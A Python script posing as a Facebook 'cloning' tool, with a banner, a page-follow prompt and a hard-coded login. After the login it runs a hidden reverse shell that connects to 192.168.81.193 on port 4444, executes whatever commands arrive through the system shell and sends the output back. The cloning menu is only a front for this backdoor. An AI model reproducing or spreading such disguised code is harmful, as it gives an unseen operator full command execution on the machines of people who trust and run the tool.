import os
import time

#!/usr/bin/python3
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
on_ipurple="\033[10;95m"  # Purple
on_icyan="\033[0;106m"    # Cyan
on_iwhite="\033[0;107m"   # White
blue="\033[0;34m"         # Blue
red="\033[0;31m"          # Red
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White
icyan="\033[0;96m"        # Cyan
on_icyan="\033[0;106m"    # Cyan

import socket
import subprocess
import sys
import os
from colorama import Fore,Back



def Main():
    host = "192.168.81.193"
    port = "4444"
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
            s.connect((host,int(port)))
    except ConnectionRefusedError:
            resp(1,"Connection refused!")
            sys.exit()
            #Shell connected with:
    resp(0, " %s:%s" % (host,port))
    while True:
        try:
            data = s.recv(4096).decode()
        except KeyboardInterrupt:
            resp(1,"Keyboard Interrupt!")
            sys.exit()
        if not data: break
        data = str(data)
        response = shell(data)
        try:
            s.send(response.encode())
        except ConnectionResetError:
            resp(1,"Connection Closed. Try Again!")
            sys.exit()
def resp(typo,message):
    if typo == 1:
        print(f"{Fore.RESET}[ {Fore.RED}ERROR{Fore.RESET} ] Exiting the shell. \n\t[\033[033m Err \033[00m: {message} ]")
    elif typo == 0:
        print(f"{Fore.RESET}[ {Fore.GREEN}OK{Fore.RESET} ] {message}")
def shell(command):
    command = command.rstrip()
    c_com = command[0:2]
    try:
        if c_com == 'cd':
            try:
                os.chdir(command[3:])
                run = "cd: directory changed: %s" % command[3:]
            except FileNotFoundError:
                run = "cd: No such file or directory: %s" % command[3:]
        elif c_com == 'pwd':
            run = os.getcwd()
        else:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, encoding='utf-8')
            if not output:
                run = "%s: command excuted" % c_com
            else:
                run = output
    except subprocess.CalledProcessError:
        run = "%s: command not found" % command
    return run
"""
if __name__ == '__main__':
    if sys.platform == "linux":
        Main()
    else:
        win = input("Supported platform is out of range. Continue?[Y/n] ")
        if win.lower() == "y":
            Main()
        else:
            sys.exit(0)
"""
	




banner = ("""\033[132m
  \033[1;32m _____   ____   ____ _______ _____ ____  _____  ______ 
  \033[1;32m |  __ \ / __ \ / __ \__   __/ ____/ __ \|  __ \|  ____|
  \033[1;32m | |__) | |  | | |  | | | | | |   | |  | | |  | | |__   
  \033[1;32m |  _  /| |  | | |  | | | | | |   | |  | | |  | |  __|  
  \033[1;32m | | \ \| |__| | |__| | | | | |___| |__| | |__| | |____ 
  \033[1;32m |_|  \_\\____/ \____/  |_|  \_____\____/|_____/|______|
  \033[1;32m══════════════════════════════════════════════════════════\33[m 
          \033[1;32mOwner  :   Alvee Farabi\33[m 																	    
         \033[1;32mGithub  :   mdfarabi5885\33[m 	    			   						                    
        \033[1;32mFb Page  :   Root Of Code\33[m 											               
  \033[1;32m══════════════════════════════════════════════════════════\033[1;37m""")

  
print(banner)

print("[1] FIRST FOLLOW MY FACEBOOK PAGE")
print("[2] NOCK ME GET USER NAME OR PASSWORD")
print(red+"[3] EXIT")
code = (input(purple+"[+] ENTER YOUR CHOICE:" ))
if code == "1":
   os.system("xdg-open https://www.facebook.com/profile.php?id=100094179452290&mibextid=ZbWKwL")

   
  #  time.sleep(15)
elif code == "2":
      os.system("xdg-open https://wa.me/qr/HDL3YVFXBQ4JC1")
      time.sleep(5)
else:     
     exit()
      

 
    
user = "root"
pwd = "5885"
while True:
      print("\033[1;32m ══════════════════════════════════════════════════════════ ")
      username=input(blue+"[>] ENTER TOOLS USER NAME:")
      password = input(blue+"[>] ENTER TOOLS PASSWORD:")
      if user == username and pwd == password:
        print(green+"\tLogin Successful?\n")
        time.sleep(4)
        break
      else:
           print(red+"\tLogin Failed!\n")
           
print(green+"waiting Sometimes")
if __name__ == '__main__':
    if sys.platform == "linux":
        Main()
    else:
        win = input("Supported platform is out of range. Continue?[Y/n] ")
        if win.lower() == "y":
            Main()
        else:
            sys.exit(0)     
            
            
            

print(green+"[1] File Cloning")
print("[2] File Cloning")
print("[3] Public Cloning")
print("[4] Create File")
print("[5] Errors")
print("[6] Remove Token")
print(red+"[0] Exit")
root = input(cyan+'[+] Choose Option: ')
